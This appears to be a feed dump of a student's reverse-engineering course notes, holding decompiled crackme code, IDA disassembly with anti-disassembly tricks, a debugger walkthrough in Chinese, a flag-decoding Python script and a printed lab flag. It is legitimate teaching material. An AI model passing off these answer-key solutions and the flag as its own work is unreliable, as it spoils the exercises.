:::spoiler output.txt&lt;/p></description></item><item><title>Simple Reverse - 0x28(2023 Lab - Super Angry)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x282023-lab---super-angry/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x282023-lab---super-angry/</guid><description>&lt;h1 id="simple-reverse---0x282023-lab---super-angry">
 Simple Reverse - 0x28(2023 Lab - Super Angry)
 &lt;a class="anchor" href="#simple-reverse---0x282023-lab---super-angry">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler main function&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>a3)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#f92672">*&lt;/span>user_input; &lt;span style="color:#75715e">// rcx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v5; &lt;span style="color:#75715e">// rdx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v6; &lt;span style="color:#75715e">// rdx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> output[&lt;span style="color:#ae81ff">128&lt;/span>]; &lt;span style="color:#75715e">// [rsp+10h] [rbp-B0h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> user_input_cp[&lt;span style="color:#ae81ff">6&lt;/span>]; &lt;span style="color:#75715e">// [rsp+90h] [rbp-30h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> user_input_cp[&lt;span style="color:#ae81ff">5&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> __readfsqword(&lt;span style="color:#ae81ff">0x28u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( argc &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> user_input &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)argv[&lt;span style="color:#ae81ff">1&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> user_input[&lt;span style="color:#ae81ff">1&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> user_input_cp[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>user_input;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> user_input_cp[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> v5;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> user_input[&lt;span style="color:#ae81ff">3&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> user_input_cp[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> user_input[&lt;span style="color:#ae81ff">2&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> user_input_cp[&lt;span style="color:#ae81ff">3&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> v6;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> scramble_fn((&lt;span style="color:#66d9ef">__int64&lt;/span>)user_input_cp, output, &lt;span style="color:#ae81ff">0x20uLL&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>memcmp(output, verify_key, &lt;span style="color:#ae81ff">0x80uLL&lt;/span>) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Correct!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Incorrect!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0LL&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf(&lt;span style="color:#e6db74">&amp;#34;Usage: %s &amp;lt;input&amp;gt;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, &lt;span style="color:#f92672">*&lt;/span>argv);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1LL&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse - 0x29(2023 Lab - Unpackme)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x292023-lab---unpackme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x292023-lab---unpackme/</guid><description>&lt;h1 id="simple-reverse---0x292023-lab---unpackme">
 Simple Reverse - 0x29(2023 Lab - Unpackme)
 &lt;a class="anchor" href="#simple-reverse---0x292023-lab---unpackme">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AE8 mov rdi, [rsp&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">18&lt;/span>h&lt;span style="color:#f92672">+&lt;/span>start] ; start
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AED push &lt;span style="color:#ae81ff">5&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AEF pop rdx ; prot
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF0 push &lt;span style="color:#ae81ff">0&lt;/span>Ah
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF2 pop rax
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF3 syscall ; LINUX &lt;span style="color:#f92672">-&lt;/span> sys_mprotect
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF5 jmp r13
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF5
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF5 sub_5A7C endp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF5
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF8 ; &lt;span style="color:#f92672">---------------------------------------------------------------------------&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF8 loc_5AF8: ; CODE XREF: start&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">↑&lt;/span>p
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF8 pop rbp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF9 call sub_5A7C
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF9
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AF9 ; &lt;span style="color:#f92672">---------------------------------------------------------------------------&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>AFE aProcSelfExe db &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>&lt;span style="color:#f92672">/&lt;/span>proc&lt;span style="color:#f92672">/&lt;/span>self&lt;span style="color:#f92672">/&lt;/span>exe&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>B0D align &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>B0E dw &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>B10 dq &lt;span style="color:#ae81ff">81&lt;/span>B00000C1100h, &lt;span style="color:#ae81ff">0FF&lt;/span>FFFF0000000200h, &lt;span style="color:#ae81ff">7549F&lt;/span>&lt;span style="color:#ae81ff">983004&lt;/span>AE8E5h, &lt;span style="color:#ae81ff">0F&lt;/span>D374C8D48575344h, &lt;span style="color:#ae81ff">0&lt;/span>CE39482FEB5B565Eh, &lt;span style="color:#ae81ff">0FF&lt;/span>FFFBFF5E563273h
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>B10 dq &lt;span style="color:#ae81ff">778F&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>C0A72803CACh, &lt;span style="color:#ae81ff">2&lt;/span>C06740FFE7E8006h, &lt;span style="color:#ae81ff">56161&lt;/span>BE477013CE8h, &lt;span style="color:#ae81ff">0FF&lt;/span>BFFFFF75D028ADh, &lt;span style="color:#ae81ff">0&lt;/span>D801F829C80F5FDFh, &lt;span style="color:#ae81ff">0&lt;/span>C35BDFEBAC0312ABh
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>B10 dq &lt;span style="color:#ae81ff">8948505741564158&lt;/span>h, &lt;span style="color:#ae81ff">0&lt;/span>DBFFEDFEEC8148E6h, &lt;span style="color:#ae81ff">590&lt;/span>A6A5F54591000h, &lt;span style="color:#ae81ff">5003E8348&lt;/span>A548F3h, &lt;span style="color:#ae81ff">0&lt;/span>B6AB48FE8949F875h, &lt;span style="color:#ae81ff">0F&lt;/span>&lt;span style="color:#ae81ff">60&lt;/span>C0AFC0CCBB374h
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LOAD:&lt;span style="color:#ae81ff">0000000000005&lt;/span>B10 dq &lt;span style="color:#ae81ff">4&lt;/span>DF5FF6EDFFE02FFh, &lt;span style="color:#ae81ff">5E57370&lt;/span>FFFBAFC29h, &lt;span style="color:#ae81ff">50F&lt;/span>&lt;span style="color:#ae81ff">58596&lt;/span>AED7B8Ch, &lt;span style="color:#ae81ff">0&lt;/span>DFFF6FDB0579C085h, &lt;span style="color:#ae81ff">8&lt;/span>D49FD91580F6A0Eh, &lt;span style="color:#ae81ff">0E741&lt;/span>AAA00B0FF7Dh
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::spoiler Real File main Function&lt;/p></description></item><item><title>Simple Reverse - 0x30(2023 HW - Evil FlagChecker)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x302023-hw---evil-flagchecker/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x302023-hw---evil-flagchecker/</guid><description>&lt;h1 id="simple-reverse---0x302023-hw---evil-flagchecker">
 Simple Reverse - 0x30(2023 HW - Evil FlagChecker)
 &lt;a class="anchor" href="#simple-reverse---0x302023-hw---evil-flagchecker">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Anti Disassembly - 這一部分可以看一下碩一修的malware reverse的anti disassembly的修復(就是d和c的交錯使用)
Anti Debugging - 首推scylla hide&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA main&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">__cdecl&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>envp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DWORD TickCount; &lt;span style="color:#75715e">// [esp+0h] [ebp-14h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v5; &lt;span style="color:#75715e">// [esp+8h] [ebp-Ch]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> TickCount &lt;span style="color:#f92672">=&lt;/span> GetTickCount();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Sleep(&lt;span style="color:#ae81ff">120000u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> GetTickCount() &lt;span style="color:#f92672">-&lt;/span> TickCount;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v5 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">119950&lt;/span> &lt;span style="color:#f92672">||&lt;/span> v5 &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">120050&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ExitProcess(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ((&lt;span style="color:#66d9ef">void&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#66d9ef">void&lt;/span>))loc_401AE0)();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
:::spoiler IDA loc_401AE0&lt;/p>
&lt;pre tabindex="0">&lt;code>.text:00401AE0 loc_401AE0: ; CODE XREF: _main:loc_4014AB↑p
.text:00401AE0 push ebp
.text:00401AE1 mov ebp, esp
.text:00401AE3 lea esi, aHelloHacker ; &amp;#34;Hello Hacker&amp;#34;
.text:00401AE9 mov al, 48h ; &amp;#39;H&amp;#39;
.text:00401AEB cmp [esi], al
.text:00401AED jz short loc_401AF0
.text:00401AED
.text:00401AED ; ---------------------------------------------------------------------------
.text:00401AEF db 0E8h
.text:00401AF0 ; ---------------------------------------------------------------------------
.text:00401AF0
.text:00401AF0 loc_401AF0: ; CODE XREF: .text:00401AED↑j
.text:00401AF0 nop word ptr [eax+eax+00000000h]
.text:00401AF9 jmp short loc_401B01
.text:00401AF9
.text:00401AF9 ; ---------------------------------------------------------------------------
.text:00401AFB db 48h ; H
.text:00401AFC db 65h ; e
.text:00401AFD db 6Ch ; l
.text:00401AFE db 6Ch ; l
.text:00401AFF db 6Fh ; o
.text:00401B00 db 0
.text:00401B01 ; ---------------------------------------------------------------------------
.text:00401B01
.text:00401B01 loc_401B01: ; CODE XREF: .text:00401AF9↑j
.text:00401B01 jmp short loc_401B0E
.text:00401B01
.text:00401B01 ; ---------------------------------------------------------------------------
.text:00401B03 db 0E8h
.text:00401B04 db 66h ; f
.text:00401B05 db 0Fh
.text:00401B06 db 1Fh
.text:00401B07 db 84h
.text:00401B08 db 0
.text:00401B09 db 0
.text:00401B0A db 0
.text:00401B0B db 0
.text:00401B0C byte_401B0C db 0
.text:00401B0D db 0E8h
.text:00401B0E ; ---------------------------------------------------------------------------
.text:00401B0E
.text:00401B0E loc_401B0E: ; CODE XREF: .text:loc_401B01↑j
.text:00401B0E jz short loc_401B13
.text:00401B0E
.text:00401B10 jnz short loc_401B13
.text:00401B10
.text:00401B10 ; ---------------------------------------------------------------------------
.text:00401B12 db 0E8h
.text:00401B13 ; ---------------------------------------------------------------------------
.text:00401B13
.text:00401B13 loc_401B13: ; CODE XREF: .text:loc_401B0E↑j
.text:00401B13 ; .text:00401B10↑j
.text:00401B13 push 1
.text:00401B15 jmp sub_401220
&lt;/code>&lt;/pre>&lt;p>:::
:::spoiler IDA notify_debugger&lt;/p></description></item><item><title>Simple Reverse 0x06(Lab - AMessageBox)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x06lab---amessagebox/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x06lab---amessagebox/</guid><description>&lt;h1 id="simple-reverse-0x06lab---amessagebox">
 Simple Reverse 0x06(Lab - AMessageBox)
 &lt;a class="anchor" href="#simple-reverse-0x06lab---amessagebox">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.796t.com/content/1550025925.html">組合語言ROL和RCL的區別&lt;/a>&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題其實以逆向的角度來說很簡單&lt;/p>
&lt;ol>
&lt;li>先用DIE看一些資訊
&lt;img src="https://hackmd.io/_uploads/BkFoZ06u3.png" alt="" />
發現有加UPX的殼，這件事情可以透過IDA更加確定
&lt;img src="https://hackmd.io/_uploads/ryG0-Aau3.png" alt="" />
可以看到Function Name只有start然後反組譯的地方看起來很噁心，那應該就是在拆殼的步驟&lt;/li>
&lt;li>先執行看看
&lt;img src="https://hackmd.io/_uploads/HktlXCaun.png" alt="" />
需要輸入flag然後用一個message box噴錯&lt;/li>
&lt;li>用x64-dbg
透過TA的講解，可以知道這一題不需要解殼，只需要用動態debugger看一下就可以了
&lt;ol>
&lt;li>我們知道題目有使用到message box的API，所以我們可以先鎖定該API在哪邊呼叫，再往回trace出他的判斷
我們可以利用符號的視窗看到這支程式有用到那些API Module(.dll)，而message box的API是在&lt;code>user32.dll&lt;/code>，用下面的搜尋可以縮小範圍，但這個多種類的messagebox，具體來說是用哪一個也不知道，所以可以全選後都設立中斷點
&lt;img src="https://hackmd.io/_uploads/S18CNR6_h.png" alt="" />&lt;/li>
&lt;li>剩下的就是跟一般debugger差不多的操作，當追到call messagebox之前的break point時，可以看一下call stack(呼叫堆疊)往前trace是誰呼叫了API，發現是&lt;code>00C7110B&lt;/code>，點進去看一下可以明顯看到Correct/Wrong的字樣，所以可以判斷應該是這一段程式在判斷我們輸入的東西
&lt;img src="https://hackmd.io/_uploads/r1E7LAad3.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/Syt_8Cadh.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/BkixvRTOn.png" alt="" />&lt;/li>
&lt;li>分析判斷的程式
這裡就是要考驗耐心和不斷的觀察register的變化，認真看大概花個半小時就可以知道這一段在幹嘛(我就菜QAQ)
&lt;img src="https://hackmd.io/_uploads/S10aORTd2.png" alt="" />&lt;/li>
&lt;li>結論是中間的那些==重要的操作==其實就是左旋轉+XOR &lt;code>0x87&lt;/code>這樣而已，所以我們就可以開寫腳本了，把東西反著作回去就好了&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">import binascii

enc_flag = [0xB5, 0xE5, 0x8D, 0xBD, 0x5C, 0x46, 0x36, 0x4E, 0x4E, 0x1E, 0x0E, 0x26, 0xA4, 0x1E, 0x0E, 0x4E, 0x46, 0x06, 0x16, 0xAC, 0xB4, 0x3E, 0x4E, 0x16, 0x94, 0x3E, 0x94, 0x8C, 0x94, 0x8C, 0x9C, 0x4E, 0xA4, 0x8C, 0x2E, 0x46, 0x8C, 0x6C]

def pad(m):
 length = 0
 if len(m) % 8 != 0:
 length = 8-len(m) % 8
 return &amp;#39;0&amp;#39; * length + m

FLAG = []
for i in range(len(enc_flag)):
 enc_flag[i] ^= 0x87
 tmp = pad(bin(enc_flag[i])[2:])
 tmp = hex(int(tmp[-3:] + tmp[:-3], 2))
 FLAG.append(binascii.unhexlify(tmp[2:]).decode())

print(&amp;#34;&amp;#34;.join(FLAG))
&lt;/code>&lt;/pre>&lt;p>Flag: &lt;code>FLAG{8699314d319802ef792b7babac9da58a}&lt;/code>&lt;/p></description></item><item><title>Simple Reverse 0x08(Lab - GetProcAddress)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x08lab---getprocaddress/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x08lab---getprocaddress/</guid><description>&lt;h1 id="simple-reverse-0x08lab---getprocaddress">
 Simple Reverse 0x08(Lab - GetProcAddress)
 &lt;a class="anchor" href="#simple-reverse-0x08lab---getprocaddress">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulefilenamea?ns-enrollment-type=Collection&amp;amp;ns-enrollment-id=rdg3b1j45ye486">GetModuleFileNameA 函式&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/fileapi/nf-fileapi-createfilea">createFileA 函式&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/fileapi/nf-fileapi-setfilepointer?ns-enrollment-type=Collection&amp;amp;ns-enrollment-id=rdg3b1j45ye486">setFilePointer 函式&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/fileapi/nf-fileapi-readfile">ReadFile 函式&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA main function&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">int __cdecl main(int argc, const char **argv, const char **envp)
{
 char *v3; // rdi
 __int64 i; // rcx
 char v6[32]; // [rsp+0h] [rbp-40h] BYREF
 char v7; // [rsp+40h] [rbp+0h] BYREF
 char lpFilename[304]; // [rsp+50h] [rbp+10h] BYREF
 char lpBuffer[136]; // [rsp+180h] [rbp+140h] BYREF
 char flag[64]; // [rsp+208h] [rbp+1C8h] BYREF
 __int64 File_HANDLE_VALUE; // [rsp+248h] [rbp+208h]
 int j; // [rsp+264h] [rbp+224h]

 v3 = &amp;amp;v7;
 for ( i = 146i64; i; --i )
 {
 *v3 = 0xCCCCCCCC;
 v3 += 4;
 }
 sub_140011375(&amp;amp;unk_1400230B5);
 sub_1400113AC();
 printf(&amp;#34;Give me flag: &amp;#34;);
 scanf(&amp;#34;%39s&amp;#34;, flag);
 (GetModuleFileNameA_0)(0i64, lpFilename, 260i64);
 File_HANDLE_VALUE = (CreateFileA)(
 lpFilename,
 0x80000000i64,
 FILE_SHARE_READ,
 0i64,
 OPEN_EXISTING,
 FILE_ATTRIBUTE_NORMAL,
 0i64);
 if ( File_HANDLE_VALUE == -1
 || ((SetFilePointer)(File_HANDLE_VALUE, 0x4Ei64, 0i64, FILE_BEGIN),
 !(ReadFile)(File_HANDLE_VALUE, lpBuffer, 39i64, 0i64, 0i64)) )
 {
LABEL_11:
 puts(&amp;#34;Wrong...&amp;#34;);
 }
 else
 {
 for ( j = 0; j &amp;lt; 39; ++j )
 {
 if ( (flag[j] ^ lpBuffer[j]) != byte_14001E000[8 * j] )
 goto LABEL_11;
 }
 puts(&amp;#34;Correct!!!&amp;#34;);
 }
 sub_140011311(v6, &amp;amp;unk_14001BB18);
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse 0x11(Lab - Exception)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x11lab---exception/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x11lab---exception/</guid><description>&lt;h1 id="simple-reverse-0x11lab---exception">
 Simple Reverse 0x11(Lab - Exception)
 &lt;a class="anchor" href="#simple-reverse-0x11lab---exception">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://mycollegenotebook.medium.com/%E4%B9%98%E6%B3%95-%E9%99%A4%E6%B3%95%E7%9A%84%E9%81%8B%E7%94%A8-%E7%B5%84%E5%90%88%E8%AA%9E%E8%A8%80%E7%AD%86%E8%A8%98-638b1eac4696">乘法、除法的運用 — 組合語言筆記&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/cpp/cpp/try-except-statement?view=msvc-170&amp;amp;viewFallbackFrom=msvc-170%3Fns-enrollment-type%3DCollection&amp;amp;ns-enrollment-id=rdg3b1j45ye486">try-except 陳述式&lt;/a>&lt;/p>
&lt;blockquote>
&lt;ul>
